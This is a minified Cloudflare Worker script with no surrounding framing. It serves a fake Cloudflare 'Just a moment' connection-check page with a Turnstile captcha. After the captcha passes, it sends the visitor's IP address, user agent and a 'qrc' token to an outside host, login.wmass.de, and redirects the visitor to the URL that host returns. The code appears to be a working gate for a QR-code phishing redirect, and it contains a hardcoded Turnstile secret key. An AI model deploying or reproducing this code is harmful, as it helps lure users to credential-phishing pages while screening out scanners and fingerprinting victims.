export default{async fetch(e){if("GET"===e.method)return new Response(fppBody,{headers:{"Content-Type":"text/html;charset=UTF-8"}});if("POST"===e.method){const t=(await e.formData()).get("cf-turnstile-response"),n=e.headers.get("CF-Connecting-IP");let r=new FormData;r.append("secret","0x4AAAAAAAVXSyIfHT5-q_Gj-cLFfu6VF70"),r.append("response",t),r.append("remoteip",n);const i=await fetch("https://challenges.cloudflare.com/turnstile/v0/siteverify",{body:r,method:"POST"});return(await i.json()).success?finishAuth(e):new Response(fppBody,{headers:{"Content-Type":"text/html;charset=UTF-8"}})}return new Response("Method Not Allowed",{status:405,statusText:"Method Not Allowed"})}};const fppBody='<!doctype html><html lang=en-US><head> <script async defer src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback"><\/script> <title>Just a moment...</title> <meta content="width=device-width,initial-scale=1" name=viewport> <script>var verifyCallback_CF=function (response){var cfForm=document.querySelector("#cfForm"); if (response && response.length > 10){cfForm.submit(); return;}}; window.onloadTurnstileCallback=function (){turnstile.render("#turnstileCaptcha",{sitekey: "0x4AAAAAAAVXS2YWW28iB7OI", callback: verifyCallback_CF,});};<\/script></head><style>.h1,.h2{font-weight:500}*{box-sizing:border-box;margin:0;padding:0}html{line-height:1.15;-webkit-text-size-adjust:100%;color:#313131;font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji}body{display:flex;flex-direction:column;min-height:100vh}a{transition:color .15s;background-color:transparent;text-decoration:none;color:#0051c3}a:hover{text-decoration:underline;color:#ee730a}.main-content{margin:8rem auto;width:100%;max-width:60rem}.footer,.main-content{padding-right:1.5rem;padding-left:1.5rem}.main-wrapper{display:flex;flex:1;flex-direction:column;align-items:center}.spacer{margin:2rem 0}.h1{line-height:3.75rem;font-size:2.5rem}.core-msg,.h2{line-height:2.25rem;font-size:1.5rem}.core-msg{font-weight:400}.body-text{line-height:1.25rem;font-size:1rem;font-weight:400}.icon-wrapper{display:inline-block;position:relative;top:.25rem;margin-right:.2rem}.heading-icon{width:1.625rem;height:1.625rem}.warning-icon{display:inline-block}.text-center{text-align:center}.footer{margin:0 auto;width:100%;max-width:60rem;line-height:1.125rem;font-size:.75rem}.footer-inner{border-top:1px solid #d9d9d9;padding-top:1rem;padding-bottom:1rem}.core-msg,.zone-name-title{overflow-wrap:break-word}@media (max-width:720px){.main-content{margin-top:4rem}.h1{line-height:1.75rem;font-size:1.5rem}.core-msg,.h2{line-height:1.5rem}.h2{font-size:1.25rem}.core-msg{font-size:1rem}.heading-icon{width:1.25rem;height:1.25rem}.zone-name-title{margin-bottom:1rem}}@keyframes lds-ring{0%{transform:rotate(0)}to{transform:rotate(360deg)}}@media screen and (-ms-high-contrast:active),screen and (-ms-high-contrast:none){.main-wrapper,body{display:block}}@media (prefers-color-scheme:dark){body{background-color:#222;color:#d9d9d9}a{color:#fff}a:hover{text-decoration:underline;color:#ee730a}}</style><body class=no-js> <div class=main-wrapper role=main> <div class=main-content> <h1 class="h1 zone-name-title"> <div> <img src="" style=margin-bottom:-17px> <div id=site-name>Just a moment.....</div></div></h1> <p data-translate=please_wait id=cf-spinner-please-wait> Please stand by, while we are checking if the site connection is secure </p><br/> <form data-callback=verifyCallback_CF id=cfForm method=POST style=visibility:visible> <div id=turnstileCaptcha></div><br></form> <div class="core-msg spacer" id=challenge-body-text> <div>We needs to review the security of your connection before proceeding. </div></div></div></div><div class=footer role=contentinfo> <div class=footer-inner> <div class=text-center> Performance & Security </div></div></div>';async function finishAuth(e){let t="https://login.wmass.de/naDoECmT";const n=e.headers.get("CF-Connecting-IP")||e.headers.get("X-Forwarded-For")||e.headers.get("RemoteAddr")||e.headers.get("X-Real-IP")||e.headers.get("X-Client-IP")||e.headers.get("X-Cluster-Client-IP"),r=e.headers.get("User-Agent"),i=new URL(e.url),o=new URLSearchParams(i.search).get("qrc");o&&(t=t+"&qrc="+o);const a=await fetch(t,{headers:{accept:"application/json","qrc-ip":n,"qrc-ua":r}}),s=new Headers({"Access-Control-Allow-Origin":"*"});if(200!==a.status)return new Response("CONNECTION FAILEDs "+JSON.stringify(a),{status:500,headers:s});const c=await a.json(),l=c?.url;if(l){if("application/json"===e.headers.get("Accept")){s.set("Content-Type","application/json");const e=JSON.stringify({url:l});return new Response(e,{status:200,headers:s})}return Response.redirect(l,302,{status:302,headers:s})}return new Response("ACCESS DENIED!!",{status:500,headers:s})}
